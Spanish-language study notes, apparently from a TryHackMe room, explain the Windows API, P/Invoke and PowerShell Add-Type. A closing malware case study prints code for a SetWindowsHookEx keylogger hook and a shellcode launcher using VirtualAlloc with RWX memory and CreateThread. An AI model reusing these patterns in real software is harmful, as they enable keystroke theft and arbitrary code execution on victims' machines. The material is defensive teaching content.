# Introducción

Las API de Windows dan una funcionalidad nativa a la hora de interactuar con los componentse clave de Windows. Las API son ampliamente usadas por muchos, incluyendo red teamers, actores maliciosos, blue teamers, desarrolladores de software.

La API integra sin problema al sistema Windows, ofrenciendo su gama de casos para cada uso. Solo hay que ver que el Win32 API se uso como una herramienta ofensiva y desarrollo de malware, EDR (Endpoint Detecetion & Response).

# Objetivos de aprendizaje

- Entender que son las API, casos de uso, como interactua con los susbsistemas del OS
- Aprender como implementar las API de Windows en diferentes lenguajes
- Entender como la API de Windows se usa con una perspectiva maliciosa y desglosar casos prácticos

# Subsistemas y Interacción de Hardware

Los programas aveces necesitan acceder o modificar subsistemas de Windows o hardware pero estan restriguindas para mantener la estabilidad de la máquina. Para arreglar este problema, Windows saco Win32 API, una libreria con una interfaz entre las aplicaciones de usuario y el kernel

Windows distingue el acceso al hardware en dos modos: User y modo kernel. Esto determinal el hardware, kernel y el acceso a la memoria y aplicaciones o drivers permitidos.

![image](https://github.com/user-attachments/assets/6a8ad962-32d6-49e5-ba3d-f4efd14300b0)

# Componentes de la API de Windows

La API de Win32, mas conocida como Windows API, tiene bastantes comoponentes dependientes que se usan para definir la estructura y organización de la API.

Vamos a desglosar la API

![image](https://github.com/user-attachments/assets/a676a328-d867-4f6f-980b-34ef2babdafe)

# Liberias OS

Cada API llama a la libreria de Win32 en la memoria y requiere un puntero a la dirección de memoria. El proceso se obtiene con punteros estas funciones se oscurecen porque la ASLR (Address Space Layout Randomization) se implementa, cada lenguaje o paquete tiene un unico procedimiento para el ASLR.

## Cabecera de Archivo Windows

Microsoft lanzo las cabeceras de archivo Windows, es una solución directa de los problemas asociados con la implementación ASLR. Este concepto de alto nivel, carga y determina como las llamadas se hacen y se crean en la tabla para aobtener la funcion de direccion o puntero.

Una vez "windows.h" se incluye en el top; la funcion de Win32 se llama

## P/Invoke

Microsoft describe P/Invoke como una plataforma para invoacar la tecnologia de acceso a estructuras.

Es una herramienta que cogue el proceso entero de invocar y sin necesidad de mantener el código o otras palabras, llama a la API e importa el DDL necesario para la funcion necesario

```
using System;
using System.Runtime.InteropServices;

public class Program
{
[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
...
}

```

En el cóidgo, nosotros importamos las DLL del user 32 usando el atribudo DLLImport

```
using System;
using System.Runtime.InteropServices;

public class Program
{
...
private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);
}
```

# Estructura de llamadas de API

La llamada de la API es el segundo componente de la libreria Win32. Estas llamadas ofrecen flexibilidad y se usan en muchos casos.

Esquema:

![image](https://github.com/user-attachments/assets/550224d7-2e14-4501-b7d3-9b108ec189a4)

Cada llamada tiene una estructura pre definida. 

Por ejemplo la "WriteProcessMemory"

```
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

# Implementaciones C API

Microsoft provee en bajo nivel lenguajes de programación como C y C++ con librerias preconfiguradas que se usan para llamar a APIs

La cabecera windows.h, anteirormente tratada, es usada para definir las llamadas de las estructuras y obtener las funciones de los punteros. Para incluir la cabecera windows, pretendemos que la linea sea c o C++

#include <windows.h>

Estructura

```
HWND CreateWindowExA(
  [in]           DWORD     dwExStyle, // Optional windows styles
  [in, optional] LPCSTR    lpClassName, // Windows class
  [in, optional] LPCSTR    lpWindowName, // Windows text
  [in]           DWORD     dwStyle, // Windows style
  [in]           int       X, // X position
  [in]           int       Y, // Y position
  [in]           int       nWidth, // Width size
  [in]           int       nHeight, // Height size
  [in, optional] HWND      hWndParent, // Parent windows
  [in, optional] HMENU     hMenu, // Menu
  [in, optional] HINSTANCE hInstance, // Instance handle
  [in, optional] LPVOID    lpParam // Additional application data
);
```

Vamos a coger estos parametros predefinidos y asignar los valores

```
HWND hwnd = CreateWindowsEx(
	0, 
	CLASS_NAME, 
	L"Hello THM!", 
	WS_OVERLAPPEDWINDOW, 
	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
	NULL, 
	NULL, 
	hInstance, 
	NULL
	);
```

Hemos definido nuesstra primera llamada de API en C! vamos a implementar dentro de una aplicacion y usar esta funcionalidad.

```
BOOL Create(
        PCWSTR lpWindowName,
        DWORD dwStyle,
        DWORD dwExStyle = 0,
        int x = CW_USEDEFAULT,
        int y = CW_USEDEFAULT,
        int nWidth = CW_USEDEFAULT,
        int nHeight = CW_USEDEFAULT,
        HWND hWndParent = 0,
        HMENU hMenu = 0
        )
    {
        WNDCLASS wc = {0};

        wc.lpfnWndProc   = DERIVED_TYPE::WindowProc;
        wc.hInstance     = GetModuleHandle(NULL);
        wc.lpszClassName = ClassName();

        RegisterClass(&wc);

        m_hwnd = CreateWindowEx(
            dwExStyle, ClassName(), lpWindowName, dwStyle, x, y,
            nWidth, nHeight, hWndParent, hMenu, GetModuleHandle(NULL), this
            );

        return (m_hwnd ? TRUE : FALSE);
    }
```

# Implementaciones .NET y PowerShell

Para entender como P/invoke es implementado, vamos a ir abajo

```
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}
```

La funcion de clase define la llamada de la API y define la referencia para el futuro

La libreria ocn la que se llama a la estructura de la API se gurada debe ser importada usando DllImport. La importación de DLLs es igual que las cabecera de los paquetes requiere imoprtar una DLL especifica con la que la API llamara. 

Podemos crear un nuevo punto de aAPI de llamada para usando cuando queramos, definido por intPTR. 

Ahora podemos implementar la definicion de la API dentro de la aplicacion y usar la funcionalidad.

```
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

static void Main(string[] args) {
	bool success;
	StringBuilder name = new StringBuilder(260);
	uint size = 260;
	success = GetComputerNameA(name, ref size);
	Console.WriteLine(name.ToString());
}
```

El programa debera devolver el nombre del ordenador.

Ahora que sabemos como funciona en .NET vamos a ver como adoptarlo en PowerShell

Definiendo la API identico a .NET, pero necesitaremos crear el meotdo de clases y añadir nuevos operadores

```
$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;
```

Las llamadas ahora estan definidas, pero PowerShell requiere otro paso antes de ser inicializado. Deberemoscrear un nuevo tipo de punto de Win32 con el metodo. La función Add-Type creara un archivo temporal en /emp y compilara las funciones necesarias usando csc.exe

```
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
```

# LLamadas comunmente abusadas por la API

Varias llamadas API con la libreria Win32 que pueden ser aprovechadas para actividad maliciosa

Varias entidades relacionadas con la documentación y organización estan todas disponibles en las llamadas API con vectores maliciosos

Mientras muchas llamadas pueden ser abusadas

Ejemplos

![image](https://github.com/user-attachments/assets/2422714e-dff9-4f03-8cfe-24562b0ec317)

# Malware Caso de Estudio

Ahora que entendemos como implementar las liberias Win32 y llamadas que pueden ser abusadas, vamos a ver dos ejemplos de malware y obeservar como funciona

## Keylogger

PAra analizar un keylogger, necesitaremos recoger las llamadas de API e implementarla. Porque el keylogger esta escrito en C@, deberemos usar P/Invoke para obtener los puntos de llamada. Debajo veremos

```
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetModuleHandle(string lpModuleName);
private static int WHKEYBOARDLL = 13;
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetCurrentProcess();
```

Explicación de cada API

![image](https://github.com/user-attachments/assets/4f457244-916e-4627-a606-1c4ff39c906c)

PAra mantener una integridad etica en caso de estudio, nosotros debemos ver como recolecta los ejemplos. Nosotros deberemos analizar como los ejemplos funciona con el proceso correspondiente.

```
public static void Main() {
	_hookID = SetHook(_proc);
	Application.Run();
	UnhookWindowsHookEx(_hookID);
	Application.Exit();
}
private static IntPtr SetHook(LowLevelKeyboardProc proc) {
	using (Process curProcess = Process.GetCurrentProcess()) {
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
	}
}
```

## Shellcode Launcher

```
private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
```

![image](https://github.com/user-attachments/assets/ea80478c-f1c0-49c7-a723-d69ca6de2945)

```
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;
```






